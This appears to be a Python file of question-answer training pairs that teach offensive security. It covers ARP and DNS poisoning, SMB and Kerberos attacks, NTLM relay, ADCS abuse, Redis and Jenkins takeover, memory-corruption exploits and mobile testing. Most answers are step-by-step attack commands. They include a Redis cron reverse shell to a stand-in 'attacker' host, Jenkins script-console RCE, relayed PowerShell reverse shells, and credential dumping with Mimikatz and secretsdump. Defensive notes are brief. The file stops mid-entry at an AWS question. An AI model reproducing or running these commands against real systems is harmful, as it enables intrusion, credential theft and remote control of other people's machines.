p("How does a man-in-the-middle (MITM) attack work and how do you execute one?",
'''MITM attack positions attacker between two communicating parties to intercept and optionally modify traffic. ARP poisoning (LAN MITM): ARP is stateless and unauthenticated; send gratuitous ARP replies poisoning ARP cache; associate gateway MAC address with attacker MAC: arpspoof -i eth0 -t 192.168.1.1 192.168.1.254 (tell gateway that 192.168.1.1 is at attacker MAC) AND arpspoof -i eth0 -t 192.168.1.254 192.168.1.1 (tell 192.168.1.1 that gateway is at attacker MAC); enable IP forwarding (echo 1 > /proc/sys/net/ipv4/ip_forward) to pass traffic; capture with Wireshark or Bettercap. SSL stripping: if attacker is MITM and victim navigates to http://bank.com (not HTTPS); attacker establishes HTTPS with bank.com but serves HTTP to victim; victim sees HTTP, sends credentials in cleartext; Bettercap includes SSL strip module; HSTS (HTTP Strict Transport Security) prevents this if preloaded. Evil twin WiFi: create rogue AP with same SSID as target network; force disconnection from legitimate AP via deauth frames (aireplay-ng -0 1 -a BSSID -c CLIENT); clients reconnect to evil twin; attacker controls traffic. Captive portal attack: clients connecting to open WiFi; present fake login page matching target org; capture credentials. Tools: Bettercap (comprehensive MITM framework); Ettercap; mitmproxy; Responder. Defense: ARP inspection (Dynamic ARP Inspection on managed switches); 802.1X port authentication; HTTPS everywhere + HSTS preloading; certificate pinning; VPN on untrusted networks.''')

p("Explain how to perform a DNS poisoning attack.",
'''DNS cache poisoning: corrupting DNS resolver cache to return attacker-controlled IP for legitimate domain. Kaminsky attack (2008): DNS uses 16-bit transaction ID and source port for validation; Kaminsky discovered source port was predictable; attacker sends many forged DNS responses with all possible transaction IDs before legitimate response arrives; if forged response arrives first with matching ID, cache is poisoned for entire zone. Modern DNS hardening: randomised source ports (65,536 combinations * 65,536 TXIDs = 4.3 billion combinations -- much harder to guess); DNSSEC (cryptographic signatures on DNS records -- resolver validates signatures; attacker cannot forge signed records); DNS-over-HTTPS/TLS (prevents interception). Attack scenarios: (1) On-path MITM where attacker can intercept DNS traffic: modify DNS responses in transit; send forged answers with attacker IP. (2) Predictable TXID in old or misconfigured resolver: send flood of forged responses. (3) BGP hijacking + DNS: hijack IP prefix of authoritative DNS server; respond to DNS queries for target domain with attacker IP. Practical impact: redirect banking domain to phishing site; intercept email (MX record poisoning); DoS by returning NXDOMAIN. DNSSEC validation: resolver checks RRSIG (signature) against DNSKEY; chain of trust from root; even if response is forged, invalid signature detected. Tools: dnschef (DNS proxy/forwarder with spoofing); dnsspoof (DNS spoof on LAN via ARP poisoning).''')

p("How do you attack IPv6 networks?",
'''IPv6 attack surface: (1) SLAAC (Stateless Address Autoconfiguration) attacks: SLAAC assigns IPv6 addresses via Router Advertisements (RA); attacker sends rogue RA on LAN claiming to be IPv6 router; hosts configure attacker as their IPv6 default gateway; MITM without ARP poisoning; tool: fake_router6 from the thc-ipv6 toolkit. (2) DHCPv6 attacks: attacker responds to DHCPv6 Solicit messages; assigns attacker as DNS server; DNS hijacking for all IPv6-enabled hosts; Responder supports rogue DHCPv6. (3) Neighbor Discovery Protocol (NDP) spoofing: NDP replaces ARP in IPv6; attacker sends unsolicited Neighbor Advertisement claiming to be the gateway; poisons NDP cache. (4) IPv6 tunnels as evasion: if firewall blocks IPv4 but allows IPv6 or vice versa; 6to4, Teredo, ISATAP tunnels carry IPv6 over IPv4; may bypass security controls focused on IPv4. (5) Dual-stack environments: hosts have both IPv4 and IPv6; if security monitoring or WAF only inspects IPv4, attacker communicates via IPv6 unmonitored; many Windows hosts prefer IPv6 over IPv4 (RFC 3484 preference table). (6) Extension header abuse: IPv6 supports extension headers for routing, fragmentation; fragmentation of security headers can bypass firewall/IDS signature matching. (7) Multicast abuse: IPv6 uses multicast heavily (no broadcast); all-routers multicast group; reconnaissance by sending to multicast addresses to identify all routers and hosts. Tools: thc-ipv6 toolkit; chiron (IPv6 security assessment framework).''')

p("How do you enumerate and attack SMB (Server Message Block)?",
'''SMB attack methodology: Port 445 (direct) or 139 (NetBIOS over TCP). Enumeration: null session (anonymous): smbclient -N -L //TARGET; smbmap -H TARGET (list shares, permissions); enum4linux -a TARGET (full enum: shares, users, groups, password policy). Authenticated enumeration: smbmap -H TARGET -u user -p pass; crackmapexec smb 10.0.0.0/24 -u user -p pass --shares. Anonymous share access: mount open share: smbclient //TARGET/SHARE -N; look for configuration files, passwords, executable scripts, documents with sensitive data. Exploits: MS17-010 (EternalBlue): Windows 7/Server 2008R2 and earlier; unauthenticated RCE via buffer overflow in SMBv1; nmap --script smb-vuln-ms17-010 TARGET; Metasploit: use exploit/windows/smb/ms17_010_eternalblue. MS08-067: Windows XP/Server 2003 unauth RCE. PrintNightmare (CVE-2021-1675/34527): local privilege escalation or remote code execution via Print Spooler; exploit with impacket or Cube0x0 PoC. SMB relay: if SMB signing disabled (common on non-DC Windows), relay captured NTLM authentication to another host; ntlmrelayx.py -tf targets.txt; works with Responder in capture mode. Brute force: crackmapexec smb TARGET -u userlist.txt -p passlist.txt --no-bruteforce (spray one password per user); hydra -L users.txt -P passwords.txt smb://TARGET. Password spraying avoids lockout: one attempt per account then wait.''')

p("What is Kerberoasting and how do you perform it?",
'''Kerberoasting: offline brute-force attack against service account passwords by exploiting Kerberos TGS (Ticket Granting Service) mechanism. Background: any domain user can request a Kerberos service ticket for any SPN (Service Principal Name); ticket is encrypted with the service account NTLM hash (RC4) or AES key; if account uses weak password, hash can be cracked offline. Requirements: valid domain user account (low privilege); service account with SPN set (SPNs are set on service accounts running services like SQL Server, IIS, etc). Attack steps: (1) Enumerate SPNs: GetUserSPNs.py domain/user:pass@DC-IP -outputfile hashes.txt (Impacket); or Rubeus.exe kerberoast /outfile:hashes.txt (from domain-joined Windows). (2) Request TGS: GetUserSPNs.py automatically requests tickets for all SPNs and outputs in hashcat format. (3) Crack offline: hashcat -m 13100 hashes.txt rockyou.txt --rules /usr/share/hashcat/rules/best64.rule; no connection to DC needed during cracking; isolated offline attack. (4) Use cracked password: authenticate as service account; if service account is in privileged group, escalate. Prioritise: crack service accounts that are members of Domain Admins, local admins on servers, or have interesting delegations. Defense: use gMSA (Group Managed Service Accounts): 120-char auto-rotating random passwords = infeasible to crack; require AES encryption for all service accounts (prevents RC4 TGS -- AES cracking is slower); set strong (25+ char) passwords on all service accounts; monitor Event 4769 with encryption type 0x17.''')

p("Explain AS-REP Roasting and when it is applicable.",
'''AS-REP Roasting: offline attack against Kerberos pre-authentication disabled accounts. Normal Kerberos pre-auth: when requesting TGT, client must prove identity by encrypting timestamp with NTLM hash; if pre-auth enabled, AS-REP (authentication server response) only sent after validating pre-auth data. Pre-auth disabled (AS-REP Roasting target): if account has UF_DONT_REQUIRE_PREAUTH flag; anyone can send AS-REQ (AS request) without pre-auth; KDC responds with AS-REP containing TGT encrypted with account password hash; attacker captures AS-REP and cracks hash offline. Requirements: no credentials needed (unlike Kerberoasting which requires a valid domain account); only need network connectivity to DC port 88. Attack: GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt (Impacket -- tries all users in list); Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt (requires domain join but no creds). Crack: hashcat -m 18200 asrep.txt rockyou.txt. Finding targets without credentials: if LDAP null session allowed, enumerate users with pre-auth disabled; otherwise, need user list (from web enumeration, email format guessing, common names). Defense: require pre-authentication for all accounts (check for UF_DONT_REQUIRE_PREAUTH flag, remove it); monitor Event 4768 with Pre-Authentication Type = 0 (no pre-auth); strong passwords on affected accounts.''')

p("How do you exploit weak or default SNMP configurations?",
'''SNMP (Simple Network Management Protocol) exposes device configuration and performance data. Version vulnerabilities: SNMPv1 and v2c use community strings (shared password in cleartext) for authentication; default community string public (read-only) or private (read-write) on most devices. Enumeration: nmap -sU -p 161 --script snmp-info,snmp-interfaces,snmp-sysdescr TARGET; onesixtyone -c community.txt TARGET (community string brute force -- tries rockyou or snmp-common-communities wordlist); snmpwalk -c public -v 2c TARGET 1.3.6 (walk entire MIB tree). Information disclosure: system description (OS, version); running processes; network interfaces and IP addresses; installed software; open TCP/UDP ports; routing table; user accounts (some MIBs expose this); WiFi SSIDs and passwords (on some Cisco devices). Read-write access: if private community string found: snmpset command to modify configuration; on some routers: change SNMP config, redirect traffic, disable interfaces; Cisco IOS: can read/write configs via TFTP using SNMP. Exploitation: snmpwalk -c public -v 1 TARGET 1.3.6.1.2.1.25.4.2.1.2 (Windows running processes); 1.3.6.1.2.1.25.6.3.1.2 (installed software). SNMPv3 security: authentication (MD5/SHA) and encryption (AES/DES); requires username + auth password + priv password; much harder to exploit if configured correctly. Remediation: disable SNMPv1/v2c; use SNMPv3 with strong passwords; restrict SNMP to management VLAN via ACL; change default community strings; disable SNMP entirely if not needed.''')

p("How do you exploit Redis when it is exposed to the network?",
'''Redis network exposure: Redis has no authentication by default; if bound to 0.0.0.0 or public interface, attackers can connect directly. Exploitation paths: (1) Direct access: redis-cli -h TARGET; INFO (server info); KEYS * (list all keys); GET key (read value); may contain session tokens, API keys, PII, cached credentials. (2) Write SSH keys (if Redis runs as root or user with home dir): CONFIG SET dir /root/.ssh; CONFIG SET dbfilename authorized_keys; SET sshkey "ssh-rsa AAAA...attacker_pubkey..."; BGSAVE; connect via SSH as root. (3) Write cron job (if Redis runs as root): CONFIG SET dir /etc/cron.d; CONFIG SET dbfilename backdoor; SET cron "\n\n* * * * * root bash -i >& /dev/tcp/attacker/4444 0>&1\n\n"; BGSAVE. (4) Master-slave replication for RCE (Redis 4.x+): SLAVEOF attacker 21000; attacker sends malicious .so module via replication protocol; MODULE LOAD /tmp/module.so; RCE via Redis module. (5) LUA sandbox escape (older Redis): EVAL "redis.call()" scripts executed in LUA sandbox; older versions had sandbox escapes. (6) Redis 7+ ACL: even with authentication, weak passwords brute-forceable; AUTH password. Discovery: masscan -p 6379 --rate=10000 0.0.0.0/0 (find open Redis); Shodan query: port:6379 redis. Remediation: bind to localhost only (bind 127.0.0.1); set requirepass in redis.conf with strong password; rename dangerous commands (CONFIG, SLAVEOF, MODULE); use ACLs for least-privilege; firewall port 6379.''')

p("Explain how to attack Jenkins and CI/CD systems.",
'''Jenkins attack surface: CI/CD systems often have broad network access and store sensitive credentials. Unauthenticated access: Jenkins historically allowed anonymous access including Script Console (Groovy execution = RCE); check /script endpoint: if accessible, println("id".execute().text) gives command execution. CVE-2024-23897 (CLI path traversal, critical): unauthenticated file read via CLI @argument syntax; read /etc/passwd, Jenkins secrets, API keys. Credential exposure: Jenkins stores credentials (SSH keys, API tokens, passwords) in encrypted form; if you have script console access: decrypt them using Jenkins internal API. Script console RCE (authenticated or unauthenticated if misconfigured): println("bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|bash".execute().text); or Groovy reverse shell. Pipeline injection: if user-controlled data (PR title, branch name, commit message) is interpolated into Groovy pipeline script without sanitisation; inject arbitrary Groovy commands. Credential theft via pipeline: if pipelines have access to production credentials, compromising pipeline = credential access; withCredentials block exposes secrets inside steps. Lateral movement: Jenkins agents connect back to master; if you compromise Jenkins master, deploy payload to all agents; agents often run as privileged users on build servers. JMX remote access: if Java Management Extension port exposed, unauthenticated RCE via MBeans. Defense: disable script console for non-admins; use role-based access control plugin; keep Jenkins updated; use credentials binding properly; restrict network access to Jenkins; audit pipeline code for injection.''')

p("How do you perform a SQL injection attack with Union-based extraction?",
'''Union-based SQLi extracts data by appending UNION SELECT to original query; data returned in application response alongside normal results. Prerequisites: application reflects database values in response; error-based or time-based used when no reflection. Step 1 -- find injection point: send single quote in parameter; if SQL error returned, injectable. Step 2 -- determine column count: ORDER BY 1, ORDER BY 2... ORDER BY N until error; number before error = column count. OR UNION SELECT NULL, NULL, NULL-- (increment NULLs until no error). Step 3 -- find string column: UNION SELECT NULL, "string-test", NULL-- (change NULL to string literal for each position; the position that reflects string-test in response is a string column). Step 4 -- extract data: UNION SELECT NULL, username||chr(58)||password, NULL FROM users-- (extract username:password from users table). MySQL: information_schema.tables (table names); information_schema.columns (column names); concat(username,0x3a,password) (hex for colon separator). PostgreSQL: pg_tables; string_agg(username||':'||password, ',') FROM users. Oracle: ALL_TABLES; DUAL table required (SELECT null FROM DUAL). MSSQL: sys.tables; sysobjects; xp_cmdshell (RCE if enabled); for /f tokens: SELECT 1, name, 3 FROM master..sysdatabases. Encoding: if filter blocks UNION, try: UNiOn, UN/*comment*/ION, UNION%20SELECT. Defense: parameterised queries (prepared statements); ORMs that use parameterised queries; input validation; WAF (bypassable but adds friction).''')

p("How do you use Burp Suite for manual web application testing?",
'''Burp Suite workflow for manual web application testing: Setup: configure browser proxy to 127.0.0.1:8080; install Burp CA certificate (http://burpsuite/ in browser); add target to scope (Target > Scope > Include in scope). Proxy: intercept every request; forward (not intercept) to browse normally; Proxy > HTTP History shows all traffic; right-click interesting requests to Send to Repeater, Scanner, Intruder, Comparer. Repeater: modify and resend individual requests; test injection points manually; change parameter values, headers, methods; observe responses. Intruder: automated fuzzing; select insertion point (parameter value to fuzz); attack types: Sniper (one parameter, one payload list), Cluster Bomb (multiple parameters, multiple lists = all combinations -- good for credential stuffing); Pitchfork (multiple parameters, step through lists in parallel); Payload: wordlist for directory brute force, common passwords, SQLi payloads. Scanner (Pro): active scan selected requests; passive scan all traffic automatically; findings in Dashboard. Collaborator (Pro): out-of-band interaction detection for blind SSRF, blind XXE, blind SQLi; generates unique subdomain (uuid.burpcollaborator.net); any DNS/HTTP/SMTP interaction logged; paste payload into parameter and check Collaborator for callbacks. Extensions: JSON Web Tokens (JWT Editor); HTTP Request Smuggler; InQL (GraphQL); Autorize (IDOR/auth testing -- replay requests as low-priv user automatically); ActiveScan++ (additional checks); Param Miner (discover hidden parameters). Workflow: crawl with Spider, identify all params, manual test high-value endpoints, run scanner on authenticated session.''')

# ── ACTIVE DIRECTORY DEEP DIVE ────────────────────────────────────────────────

p("How do you exploit unconstrained Kerberos delegation?",
'''Unconstrained delegation: service configured with TrustedForDelegation=True; when user authenticates to service, their TGT (Ticket Granting Ticket) is stored in service memory; service can impersonate user to ANY other service in domain -- unconstrained. Attack: if you compromise a server with unconstrained delegation: Rubeus.exe monitor /interval:5 /nowrap (watches LSASS for new TGTs); Spooler bug (PrinterBug): coerce Domain Controller to authenticate to your unconstrained delegation server: SpoolSample.exe DC01.corp.local UNCONSTRAINED.corp.local (triggers DC machine account authentication); DC TGT arrives; import DC TGT: Rubeus.exe ptt /ticket:DCMACHINE_TGT; DCSync as DC machine account: secretsdump.py -k -no-pass DC01.corp.local (extract all hashes using DC machine account). Persistence: imported TGT is valid (10 hours); can be renewed (7 days); during window: full domain compromise. Finding unconstrained delegation machines: BloodHound query: MATCH (c:Computer {unconstraineddelegation:true}) RETURN c; or PowerView: Get-DomainComputer -Unconstrained. Constrained delegation is safer (only specific SPNs); Resource-Based Constrained Delegation (RBCD) is an alternative attack if you have GenericAll/GenericWrite on machine account. Defense: never configure unconstrained delegation except on DCs (required); use constrained delegation with Protocol Transition for specific use cases; mark sensitive accounts (krbtgt, domain admins) as Account is sensitive and cannot be delegated.''')

p("Explain NTLM relay attacks and how to chain them for maximum impact.",
'''NTLM relay: intercept NTLM authentication attempt and relay it to a target server to authenticate as the victim. Components: (1) Capture mechanism: Responder poisoning (LLMNR/NBT-NS); MITM via ARP poisoning; Spooler bug/PetitPotam forcing DC authentication. (2) Relay tool: ntlmrelayx.py -tf targets.txt -smb2support (Impacket); relay to all hosts in targets.txt. (3) Target selection: hosts where SMB signing is disabled (default on non-DC Windows workstations); check signing: crackmapexec smb subnet --gen-relay-list relay_targets.txt. Attack chains: Basic relay to get shells: ntlmrelayx.py -tf targets.txt -smb2support -c "powershell -enc BASE64_REVERSE_SHELL"; victim authenticates to Responder; relayed to target; command executed as victim. LDAP relay for AD takeover: ntlmrelayx.py --no-smb-server -t ldaps://DC01 --delegate-access --escalate-user compromised_machine; relay to LDAP with RBCD attack; gives compromised machine delegation rights over victim machine. Relay to ADCS (Active Directory Certificate Services): ntlmrelayx.py -t http://CA-SERVER/certsrv/certfnsh.asp --adcs --template DomainController; relay DC auth to ADCS; receive Domain Controller certificate; use with PKINIT to get DC TGT = full domain compromise (ESC8 vulnerability). Combining attacks: PetitPotam -> ntlmrelayx -> ADCS -> DC certificate -> Golden Ticket without needing krbtgt hash. Defense: enable SMB signing everywhere; disable LLMNR and NBT-NS; disable WebDAV; enable Extended Protection for Authentication (EPA) on ADCS; require HTTPS for ADCS web enrollment.''')

p("What is RBCD (Resource-Based Constrained Delegation) and how do you exploit it?",
'''Resource-Based Constrained Delegation (RBCD): delegation model where the target resource (service) specifies which accounts are allowed to delegate to it (msDS-AllowedToActOnBehalfOfOtherIdentity attribute on target computer object). Why exploitable: if you have GenericAll, GenericWrite, WriteProperty, or WriteDACL on a computer account, you can set the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on it; this allows a controlled machine account to impersonate ANY user to the target. Attack prerequisites: GenericWrite or higher over a computer object (common in AD environments); ability to create a machine account (by default all domain users can create up to 10 machine accounts -- ms-DS-MachineAccountQuota). Steps: (1) Create machine account: addcomputer.py domain/user:pass@DC -computer-name "EVILMACHINE$" -computer-pass "Password1!". (2) Set RBCD: rbcd.py -f EVILMACHINE -t TARGET_COMPUTER -dc-ip DC domain/user:pass (sets msDS-AllowedToActOnBehalfOfOtherIdentity on TARGET). (3) Get service ticket: getST.py -spn cifs/TARGET.domain.local -impersonate Administrator domain/EVILMACHINE$:Password1!. (4) Use ticket: KRB5CCNAME=admin.ccache secretsdump.py -k -no-pass TARGET.domain.local. BloodHound shows this attack path: GenericWrite edge from compromised account to computer object -> RBCD attack path to compromise that machine. Defense: restrict ms-DS-MachineAccountQuota to 0 for regular users; audit msDS-AllowedToActOnBehalfOfOtherIdentity attribute changes; restrict who has GenericWrite on computer objects.''')

p("How do you attack Active Directory Certificate Services (ADCS)?",
'''ADCS (Active Directory Certificate Services) is Microsoft PKI; heavily integrated with AD; multiple attack vectors. ESC1 (misconfigured certificate template): template allows requestor to specify Subject Alternative Name (SAN) = any user including Domain Admin; ENROLLEE_SUPPLIES_SUBJECT flag enabled; any enroller can request cert for DA. Exploit: certipy req -ca "CA-NAME" -template "VulnTemplate" -upn administrator@domain.local -dc-ip DC. ESC2: template has Any Purpose EKU or no EKU restriction; can be used as subordinate CA to sign any cert. ESC3: enrollment agent template + EKU = Certificate Request Agent; enroll as agent, then enroll on behalf of any user for any template. ESC4: low-priv user has write permissions on template; modify template to add ENROLLEE_SUPPLIES_SUBJECT flag; exploit as ESC1. ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA; any template allows requestor-supplied SAN; exploit any template. ESC8 (NTLM relay to ADCS HTTP endpoint): relay DC machine account auth to ADCS Web Enrollment; receive DC certificate; PKINIT auth with DC cert = TGT for DC machine account = DCSync. Certipy tool (the standard for ADCS attacks): certipy find -u user@domain -p pass -dc-ip DC (enumerate vulnerable templates and CA config); certipy auth -pfx admin.pfx -dc-ip DC (authenticate with certificate to get TGT and NTLM hash). Defense: audit ADCS templates (Certipy find or PSPKIAudit); remove dangerous flags; restrict enrollment permissions; require CA manager approval for sensitive templates; enable HTTPS on ADCS web enrollment + EPA to prevent relay.''')

p("Explain Pass-the-Ticket attack in Kerberos.",
'''Pass-the-Ticket (PtT): steal Kerberos tickets from memory and use them to authenticate without knowing the account password. Kerberos tickets (TGT or TGS) stored in memory; valid for their lifetime (TGT = 10 hours, renewable for 7 days; TGS = 10 hours). Extracting tickets: Mimikatz on Windows: privilege::debug; sekurlsa::tickets /export (dumps all Kerberos tickets from LSASS to .kirbi files). Rubeus: Rubeus.exe dump /service:krbtgt (dump TGTs); dump /luid:0xdeadbeef (dump specific logon session tickets). Import and use: Mimikatz: kerberos::ptt ticket.kirbi (inject into current session); Rubeus: Rubeus.exe ptt /ticket:BASE64_TICKET. After import: klist (list current tickets); dir \\DC01\C$ (access with stolen ticket). From Linux: secretsdump.py with ccache files; KRB5CCNAME=/path/to/ticket.ccache; psexec.py -k -no-pass target.corp.local. Golden vs Silver vs PtT: PtT uses real stolen tickets; Golden Ticket forges TGT with krbtgt hash; Silver Ticket forges TGS for specific service with service account hash. Silver Ticket: forge TGS for specific service (CIFS, HTTP, HOST) using service account hash; no DC interaction needed; harder to detect (no 4768/4769 events for ticket request); TGS encrypted with service hash only; scope limited to that service. Defense: enable Credential Guard (protects LSASS in VBS; prevents Mimikatz from reading tickets); reduce ticket lifetimes; monitor for pass-the-ticket behavior (same user, different IPs in short time); Protected Users security group.''')

p("How do you perform lateral movement via WMI?",
'''WMI (Windows Management Instrumentation) lateral movement: legitimate Windows management mechanism abused for stealthy lateral movement. Why WMI: built into all Windows versions; often allowed through enterprise firewalls; less monitored than PsExec; firewall rule typically open for management. Command execution: wmiexec.py domain/user:pass@TARGET (Impacket -- semi-interactive shell via WMI; creates process, reads output via share). PowerShell: Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -enc BASE64" -ComputerName TARGET -Credential $creds. CrackMapExec: cme smb TARGET -u user -p pass -x "whoami" --exec-method wmiexec. WMI event subscription (persistence): create permanent WMI subscription: EventFilter (trigger: on system startup, time, event log entry) + EventConsumer (action: run command, execute script) + FilterToConsumerBinding; survives reboot; runs as SYSTEM; hard to detect without specific WMI monitoring. Invoke-WMIEvent (PowerSploit): set up persistent WMI subscription for backdoor. Detection: Sysmon Event 19 (WmiEventFilter), 20 (WmiEventConsumer), 21 (WmiEventConsumerToFilter) -- for WMI event subscriptions; Sysmon Event 1 (Process Create) with parent process WmiPrvSE.exe -- indicates WMI process creation; Process creation via WMI shows as child of WmiPrvSE.exe; monitor for WmiPrvSE.exe spawning cmd.exe, PowerShell, unusual processes. Defense: enable Sysmon with WMI event IDs; restrict WMI access via firewall; use Windows Defender Application Control (WDAC) to restrict WMI abuse.''')

# ── EXPLOIT DEVELOPMENT ───────────────────────────────────────────────────────

p("Explain buffer overflow exploitation basics.",
'''Buffer overflow: write more data into a fixed-size buffer than it can hold; overwrite adjacent memory including return address. Stack-based buffer overflow: local variables stored on stack; return address (RET) on stack above local variables; overwrite local buffer past its boundary to reach and overwrite RET; control EIP/RIP = control execution flow. Fuzzing: send progressively longer input until crash; cyclic pattern (Metasploit pattern_create / pwndbg cyclic) to find exact offset to RET. GDB/pwndbg: run program, trigger crash, info registers (find EIP value); cyclic_find(EIP_VALUE) = offset to RET. Control flow: at offset X, write: JUNK_PADDING (X bytes) + NEW_RET_ADDRESS (4 bytes for 32-bit, 8 bytes for 64-bit) + SHELLCODE. Finding shellcode location: if stack randomised (ASLR), need to leak stack address or find static address; return to shellcode in fixed buffer or use return-to-libc/ROP. Shellcode: NOP sled (\x90 repeated) before shellcode increases reliability; null-byte free shellcode if input processed as string; generate with msfvenom: msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -f raw -b "\x00". Protections to bypass: NX/DEP: non-executable stack = use ROP (Return Oriented Programming) -- chain existing code gadgets (ret instructions within libc/binary). ASLR: leak address via format string or info disclosure to compute libc base at runtime. Stack canary: leak canary value via format string, include correct canary in payload. PIE: need to leak binary base address before computing gadget addresses.''')

p("What is Return Oriented Programming (ROP) and how does it work?",
'''ROP (Return Oriented Programming): code reuse attack that bypasses NX/DEP by chaining existing code fragments (gadgets) in legitimate executables. Why needed: NX (No-Execute) marks stack as non-executable; shellcode on stack cannot execute. ROP idea: instead of executing new code, repurpose existing instructions ending in RET; each gadget executes a few instructions then RET; RET pops next address from stack; chain gadgets by carefully crafting stack contents. Gadget types: pop rdi; ret (load argument to rdi register on x64 = first function argument); pop rsi; ret (second argument); pop rdx; ret (third argument); call or jmp to function; system call (syscall or int 0x80). Finding gadgets: ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi"; ropper -f binary --search "pop rdi"; pwntools: elf.search(asm("pop rdi; ret")). ret2libc (classic ROP): call system("/bin/sh") using libc; gadgets: pop rdi; ret (set rdi=/bin/sh address); system() address; overflow buffer to: [pop_rdi_ret] + [bin_sh_address] + [system_address]. ret2plt: call plt stub of system which jumps to GOT entry; bypasses ASLR if libc not randomised (rare now). ASLR bypass: need libc base address; leak via format string (%p to print stack pointer), puts() to print GOT entry and calculate libc base, or ret2plt of puts to print GOT. pwntools: automates gadget search, offset finding, payload construction; p32()/p64() for address packing; process(), remote() for target.''')

p("How do you exploit format string vulnerabilities?",
'''Format string vulnerability: user-controlled string passed directly as format argument to printf/sprintf/fprintf without format specifier. Vulnerable code: printf(user_input) vs safe code: printf("%s", user_input). Primitives: (1) Information leak: %p prints stack value as pointer; %x prints hex; printf("%p %p %p %p %p %p %p %p") reads 8 values from stack -- local variables, return addresses, stack canary, libc pointers; used to bypass ASLR and canary. (2) Crash: %s dereferences stack value as string pointer; if stack value not valid pointer, segfault. (3) Arbitrary read: %N$p reads Nth argument from stack; %100$p reads 100th stack position; string "AAAA%7$p" if 7th position contains pointer to AAAA (input buffer), confirms offset for further exploitation. (4) Arbitrary write: %n writes number of bytes written so far into the address pointed to by next argument; %hn writes 2 bytes; %hhn writes 1 byte; used to overwrite GOT entries, return addresses, saved registers. Technique: control position of target address on stack (input buffer may be on stack); use positional specifier %N$n to write to target address. pwntools: fmtstr_payload(offset, {target_address: value_to_write}) generates format string payload automatically. Example: overwrite GOT entry of exit() with address of win() function; next time exit() called, win() executes. Exploitation on 64-bit: addresses contain null bytes (\x00) which terminate strings; must use different techniques (short writes or use addresses in binary that do not contain nulls).''')

# ── MOBILE SECURITY ───────────────────────────────────────────────────────────

p("How do you perform mobile application security testing on Android?",
'''Android security testing methodology: Setup: Android emulator (AVD) or physical device with USB debugging; Burp proxy configured; adb proxy: adb shell settings put global http_proxy BURP_IP:8080; install Burp CA cert: adb push BurpCA.cer /sdcard/; device Settings > Security > Install from storage. Static analysis: apktool d app.apk -o out (decompile to Smali + resources); jadx-gui app.apk (decompile to Java source); grep for: hardcoded API keys, URLs, passwords; AndroidManifest.xml: exported activities/receivers/providers (no android:exported=false = accessible by other apps); backup=true (backups expose app data via adb backup); debuggable=true (allows runtime debugging). Dynamic analysis: frida-server on device: adb push frida-server /data/local/tmp; adb shell chmod 755 /data/local/tmp/frida-server; adb shell /data/local/tmp/frida-server &. Objection (Frida wrapper): objection -g com.app.package explore; android sslpinning disable (bypass pinning); android root disable (bypass root detection); android clipboard monitor (capture clipboard). MobSF (Mobile Security Framework): automated static + dynamic analysis; upload APK; get vulnerability report. Key findings to look for: insecure data storage (SharedPreferences, SQLite with sensitive data, external storage); insecure logging (adb logcat reveals tokens); insecure IPC (exported components accessible to other apps); missing certificate validation; hardcoded credentials; weak cryptography (ECB mode, MD5, weak key size).''')

p("How do you bypass root detection in Android applications?",
'''Root detection bypass methods: apps check for root to prevent reverse engineering or policy violations. Common root detection checks: su binary presence (/system/bin/su, /system/xbin/su); test-keys in build tags; known root-related packages (com.topjohnwu.magisk, com.noshufou.android.su); writable /system partition; Magisk Manager package; Dangerous props (ro.debuggable=1, ro.secure=0); hook detection (Xposed, Frida frame detection). Bypass with Frida: generic bypass script hooks common Java root detection methods: Runtime.exec() calls for su; File.exists() checks for su/magisk; PackageManager.getPackageInfo() for root apps; hook and return false/null. Objection: android root disable (patches multiple known detection methods automatically). Magisk Hide (now DenyList): Magisk can hide itself from specific apps; app sees clean environment; most effective for apps using simple file-based checks. Frida script example: Java.perform(function() { var File = Java.use("java.io.File"); File.exists.overload().implementation = function() { var name = this.getAbsolutePath(); if (name.indexOf("su") >= 0 || name.indexOf("magisk") >= 0) { return false; } return this.exists(); }; }). Custom Frida scripts: hook specific native library functions used for root detection; use r2frida for native hook analysis. APK patching: decompile with apktool; find root check code in Smali; change branch condition (if-nez to if-eqz); recompile and sign (apksigner). For deeper protection: apps use SafetyNet/Play Integrity API (Google attestation); bypass requires Magisk with proper modules; harder to bypass.''')

p("How do you test iOS application security?",
'''iOS security testing: Setup: jailbroken device (checkra1n, palera1n for older iOS) or dynamic analysis with Frida without jailbreak. Static analysis: IPA extraction from jailbroken device or via iPhone Backup Extractor; unzip .ipa; inspect Info.plist (URL schemes, capabilities, permissions); class-dump or dsdump binary (extract Obj-C class headers); strings binary | grep -E "(http|key|pass|secret)". Binary analysis: Ghidra or Hopper Disassembler for ARM64; otool -l binary (check protections): __PAGEZERO segment present (ASLR); PIE bit set; stack canary; ARC; otool -l binary | grep -A2 ENCRYPTION_INFO (check if binary encrypted). Frida on non-jailbroken: inject frida-gadget.dylib into IPA; repack and sideload; attach Frida; limited compared to jailbroken. Objection on iOS: objection -g com.app.bundle explore; ios sslpinning disable; ios jailbreak disable; ios keychain dump (extract stored secrets). Network analysis: configure proxy in WiFi settings; install Burp CA cert (Settings > VPN & Device Management). Data storage: examine app container: /var/mobile/Containers/Data/Application/UUID/; Library/Preferences/com.app.plist (NSUserDefaults -- often stores sensitive data); Documents, Library/Caches directories; CoreData SQLite databases. Keychain: encrypted per-device by Secure Enclave; keychain dumping tools on jailbroken device (keychain-dumper); items with kSecAttrAccessibleAlways or kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly more vulnerable. URL scheme security: test custom URL scheme hijacking; open app:// from Safari; test parameter injection.''')

# ── CLOUD SECURITY ─────────────────────────────────────────────────────────────

p("How do you perform AWS penetration testing?",
